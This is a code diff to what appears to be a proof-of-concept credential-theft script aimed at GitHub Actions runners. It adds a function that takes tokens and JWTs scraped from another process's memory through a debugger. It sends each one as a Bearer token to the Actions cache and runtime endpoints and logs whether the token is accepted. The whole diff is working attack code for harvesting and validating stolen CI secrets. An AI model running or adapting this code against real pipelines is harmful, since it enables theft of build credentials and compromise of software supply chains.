@@ -16,6 +16,7 @@ import struct
 import sys
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 
 
@@ -445,6 +446,45 @@ def validate_github_token(value):
     return False
 
 
+def validate_actions_token(value):
+    for key in ("ACTIONS_CACHE_URL", "ACTIONS_RUNTIME_URL"):
+        base = os.environ.get(key, "")
+        if not base:
+            continue
+        if key == "ACTIONS_CACHE_URL":
+            suffix = "_apis/artifactcache/cache?keys=clrpipe-none&version=clrpipe-none"
+        else:
+            suffix = "_apis/connectionData?connectOptions=1&lastChangeId=-1&lastChangeId64=-1"
+        endpoint = urllib.parse.urljoin(base if base.endswith("/") else base + "/", suffix)
+        request = urllib.request.Request(
+            endpoint,
+            headers={
+                "Authorization": "Bearer " + value.decode("ascii"),
+                "Accept": "application/json",
+                "User-Agent": "clrpipe-poc-3900000",
+            },
+        )
+        try:
+            with urllib.request.urlopen(request, timeout=10) as response:
+                print(
+                    f"PIPE_TOKEN_VALIDATE kind=actions service={key} status={response.status}",
+                    flush=True,
+                )
+                if response.status < 400:
+                    return True
+        except urllib.error.HTTPError as error:
+            print(
+                f"PIPE_TOKEN_VALIDATE kind=actions service={key} status={error.code}",
+                flush=True,
+            )
+        except OSError as error:
+            print(
+                f"PIPE_TOKEN_VALIDATE kind=actions service={key} network_error={type(error).__name__}",
+                flush=True,
+            )
+    return False
+
+
 ASCII_SECRET_PATTERNS = (
     ("github-token", re.compile(rb"(?:gh[psoru]_[A-Za-z0-9_]{20,255}|github_pat_[A-Za-z0-9_]{20,255})")),
     ("jwt", re.compile(rb"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}")),
@@ -541,6 +581,7 @@ def scan_for_memory_secrets(debugger, pid, anchors):
                         print(f"PIPE_JWT_META claims={json.dumps(metadata, sort_keys=True)}", flush=True)
                         if metadata.get("iss") == "github":
                             validate_github_token(value)
+                        validate_actions_token(value)
                 findings += 1
                 if findings >= 20:
                     break
